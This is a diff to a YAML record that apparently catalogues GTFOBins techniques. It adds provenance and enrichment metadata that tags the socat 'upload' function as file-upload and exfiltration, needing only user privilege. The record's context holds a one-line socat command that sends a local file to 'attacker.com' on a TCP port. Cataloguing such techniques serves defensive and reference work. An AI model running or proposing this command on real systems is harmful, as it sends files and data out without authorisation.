@@ -12,7 +12,7 @@ sources:
   upstream_url: https://gtfobins.github.io
   license: GPL-3.0
   upstream_version: acd5246
-  last_synced: '2026-08-25'
+  last_synced: '2026-08-28'
 commands:
 - template: socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
 references:
@@ -21,3 +21,43 @@ tags:
 - linux
 - unix
 - gtfobins
+source_data:
+  GTFOBins:
+    raw:
+      binary: socat
+      function: upload
+      context: unprivileged
+    upstream_url: https://gtfobins.github.io/gtfobins/socat/
+    upstream_version: acd5246
+    last_synced: '2026-08-28'
+enrichment:
+  capabilities:
+  - value: file-upload
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd5246
+    confidence:
+      level: high
+  phases:
+  - value: exfiltration
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd5246
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: GTFOBins
+      adapter: gtfobins@acd5246
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  model: layered
+  projected_at: '2026-08-28'
+  source_hashes:
+    GTFOBins: sha256:020bcab4e488262b9087e4777eca757d45d4929ef69e4ef758da39b7d8327160
